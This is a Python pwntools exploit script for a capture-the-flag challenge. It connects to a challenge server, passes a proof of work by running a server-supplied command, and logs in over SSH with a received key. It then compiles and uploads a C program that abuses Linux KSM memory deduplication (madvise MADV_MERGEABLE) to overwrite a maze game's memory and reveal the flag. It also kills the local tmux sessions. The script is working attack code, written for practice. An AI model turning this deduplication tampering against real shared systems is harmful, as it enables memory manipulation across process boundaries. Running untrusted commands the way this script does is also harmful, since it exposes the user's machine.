#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 1337
from pwn import *
from sys import stdout
from subprocess import Popen, PIPE
import os
import re
from tmuxio import *
import re
from pathlib import Path


# Set up pwntools for the correct architecture
context.update(arch='amd64')
# Just set TERM_PROGRAM in your ~/.profile!
# context.update(terminal='CHANGEME')
#exe = context.binary = ELF(args.EXE or 'challenge')
host = args.HOST or 'localhost'
port = int(args.PORT or 1337)

# Find flag by exact match or format
# log.success(find_flag(io.recvall()))
real_flag = open("./flag.txt", "r").readline().strip()
fake_flag = open("./flag-fake.txt", "r").readline().strip()
def find_flag(output):
    if not isinstance(output, str):
        output = output.decode(errors="ignore")
    # Match real flag
    if real_flag in output:
        return real_flag
    # Match fake flag
    if fake_flag in output:
        return fake_flag
    # Match possible local flag
    with open("/flag.txt", "r") as local:
        locl_flag = local.readline().strip()
        if locl_flag in output:
            return locl_flag
    # Match regexp flag
    r = find_flag_fmt(output)
    if r is not None:
        return r
    # Definitely no flag found
    return None

# Find flag by format
# log.success(find_flag_fmt(io.recvall()))
ffmt = re.compile(r"gctf{.*}")
def find_flag_fmt(output):
    if not isinstance(output, str):
        output = output.decode(errors="ignore")
    m = ffmt.search(output)
    if m is None:
        return None
    return m.group(0)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

tempdir = tempfile.TemporaryDirectory()

POW_BYPASS = None
def pass_pow(i):
    i.recvuntil(b"[$] ")
    hashcash = i.recvuntil(b"\n").decode().strip().split(" ")
    log.info(f"Received Proof of Work challenge: {hashcash}")

    token = ""
    if POW_BYPASS is not None:
        token = POW_BYPASS
        log.info("Bypassed Proof of Work")
    else:
        log.info("Solving Proof of Work, might take a while")
        process = Popen(hashcash, stdout=PIPE) # Yes, this is dangerous if server is malicious
        (output, err) = process.communicate()
        exit_code = process.wait()
        token = output.decode().removesuffix('hashcash token: ').strip()
        log.info(f"Solved Proof of Work: {token}")

    i.sendline(token.encode())

    a = i.recvline().decode()
    if a.find("Proof of work passed"):
        log.info("Server confirmed Proof of Work")
    elif a.find("Wrong") or a.find("invalid"):
        log.info("Failed Proof of Work")
        exit(1)

port_instance = None
def parse_and_get_ssh():
    global port_instance
    io.sendlineafter(b"Press [ENTER] to start the instance", b"")

    io.recvuntil(b"-----BEGIN OPENSSH PRIVATE KEY-----")
    key = "-----BEGIN OPENSSH PRIVATE KEY-----" + io.recvuntil(b"-----END OPENSSH PRIVATE KEY-----").decode()

    log.success(f"Got the key to connect:\n{key}")

    io.recvuntil(b"Connect with 'ssh -p")
    port_instance = io.recvline().decode().split()[0]

    log.success(f"Got the connection info: ssh -p{port_instance} -i {tempdir.name}/key user@{host}")

    with open(f'{tempdir.name}/key', 'w') as f:
        f.write(key)
        f.write('\n')
    os.chmod(f"{tempdir.name}/key", 0o600)

    #log.info("Sleeping 15 seconds to let the challenge to boot")
    sleep(15) # NOTE THIS IS NOT CLEAN AND COULD LEAD TO ISSUES (needs to be there)
    a = ['ssh', '-o', 'StrictHostKeyChecking=no', f'-p{port_instance}','-i', tempdir.name + '/key', f'user@{host}']

    s = tmuxio(a, x=128, y=64)
    assert s.tmux.has_session()
    return s

    #maze = io.capture_pane(start=0, end=200)
    #ssh(timeout=ssh.forever,
    #    user='user',
    #    host=host,
    #    port=int(port_instance),
    #    keyfile=f'{tempdir.name}/key',
    #    ignore_config=True
    #    )

WALL_C = b'#'
PLAY_C = b'@'
EMPT_C = b' '
COIN_C = b'.'
ENEM_C = b'&'
TREE_C = b'^'
FLAG_C = b'F'

MAZE_CHARS = [WALL_C, PLAY_C, EMPT_C, COIN_C, ENEM_C, TREE_C, FLAG_C]

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

# Sorry if I fucked your setup XD
os.system("pkill tmux")

pass_pow(io)
log.success(f"Tempdir is {tempdir.name}")
s = parse_and_get_ssh()

sleep(5)

s.sendline(b"/bin/ksmaze")

test = None
while True:
    test = s.capture_pane()
    print("Debug:")
    print(hexdump(test))
    if b'^' in test and b'#' in test and b'@' in test:
        break
    log.info("Waiting until connection starts...")
    sleep(1)

log.success("Got the maze:")
maze = test.decode()
print(maze)

maze = maze.split('\n')
maze2 = []
for i in maze:
    maze2 += i[:64]
    maze2 = "".join(maze2)[:4096]

maze = maze2

#maze = maze2.replace("@", " ")

log.info(f"Generating deduplication code")

# C code that causes a deduplication
cpp_code = f"""
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#define SIZE 64*64
unsigned char *memory;
static unsigned char maze[SIZE+1] = "{maze}";
int main() {{
    memory = (unsigned char *)aligned_alloc(SIZE, SIZE);
    memcpy(memory, maze, SIZE);
    madvise(memory, SIZE, MADV_MERGEABLE);

    sleep(5);

    memset(memory, 'F', SIZE);

    sleep(800);
}}
"""

with open(f"{tempdir.name}/dedup_maze.cpp", "w") as f:
    f.write(cpp_code)

os.system(f"gcc -o {tempdir.name}/dedup {tempdir.name}/dedup_maze.cpp")
log.success(f"Generated deduplication binary on {tempdir.name}/dedup")

log.info("Opening another SSH connection to run it")
ssh = ssh(timeout=ssh.forever,
          user='user',
          host=host,
          port=int(port_instance),
          keyfile=f'{tempdir.name}/key',
          ignore_config=True)


ssh.put(f"{tempdir.name}/dedup", "/home/user/dedup")

sh = ssh.system('/bin/sh', env={'PS1':'', 'TERM':'xterm'})
sh.sendline(b"chmod +x /home/user/dedup")
sh.sendline(b"./dedup &")

# Give some time for KSM to work
sleep(5)

for i in range(20):
    s.send(b"w")
    test = s.capture_pane()
    f = find_flag(str(test))
    if f is not None:
        log.success(f"{f}")
        exit(0)
    sleep(1)

exit(1)
